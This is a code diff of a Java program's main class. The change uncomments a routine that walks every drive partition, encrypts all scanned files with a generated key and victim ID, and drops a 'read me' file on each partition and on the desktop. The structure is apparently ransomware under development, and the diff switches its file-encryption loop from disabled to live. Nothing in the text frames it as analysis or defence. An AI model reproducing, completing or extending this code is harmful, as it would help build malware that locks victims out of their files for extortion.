@@ -1,10 +1,16 @@
 package main;
 
 
+import encryptionAndDecryption.Encryption;
+import enums.To;
 import files.CreateReadMeFile;
 import files.GetFiles;
 import genrators.GenerateID;
 import genrators.GenerateKey;
+
+import java.io.File;
+import java.io.IOException;
+import java.util.ArrayList;
 
 public class Main {
     public static void main(String[] args) {
@@ -13,11 +19,11 @@ public class Main {
         CreateReadMeFile readMeFile = new CreateReadMeFile(id, key, 0.0f);
         GetFiles files = new GetFiles();
 
- /*       // get partitions
+        // get partitions
         File[] partitions = files.getDrivers();
         for (File partition : partitions) {
             // Encryption files
-            Encryption.encryption(files.scanFiles(partition), key);
+            Encryption.encryption(files.scanFiles(partition, To.ENCRYPTION), key);
             // Create read me file
             try {
                 readMeFile.create(partition.getPath());
@@ -33,7 +39,7 @@ public class Main {
             try {
                 readMeFile.create(desktop.toString());
             } catch (IOException ignored){}
-        }*/
+        }
         
 
         // Test
